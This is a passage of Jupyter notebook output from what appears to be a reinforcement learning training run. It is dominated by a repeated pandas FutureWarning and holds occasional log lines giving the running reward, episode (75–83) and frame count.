      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -1228.78\t Episode 75\t Frame count: 95582\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -1228.78\t Episode 75\t Frame count: 95993\t Context: 2\n",
      "Running reward: -1267.05\t Episode 76\t Frame count: 98444\t Context: 2\n",
      "Running reward: -1267.05\t Episode 76\t Frame count: 103252\t Context: 2\n",
      "Running reward: -1345.72\t Episode 77\t Frame count: 103712\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -1345.72\t Episode 77\t Frame count: 110702\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -1424.83\t Episode 78\t Frame count: 113159\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -1534.73\t Episode 79\t Frame count: 121680\t Context: 2\n",
      "Running reward: -1534.73\t Episode 79\t Frame count: 122683\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -1540.23\t Episode 80\t Frame count: 123830\t Context: 2\n",
      "Running reward: -1540.23\t Episode 80\t Frame count: 128219\t Context: 2\n",
      "Running reward: -1590.01\t Episode 81\t Frame count: 130231\t Context: 2\n",
      "Running reward: -1590.01\t Episode 81\t Frame count: 131793\t Context: 2\n",
      "Running reward: -1614.35\t Episode 82\t Frame count: 133844\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -1716.57\t Episode 83\t Frame count: 145990\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -1716.57\t Episode 83\t Frame count: 147561\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
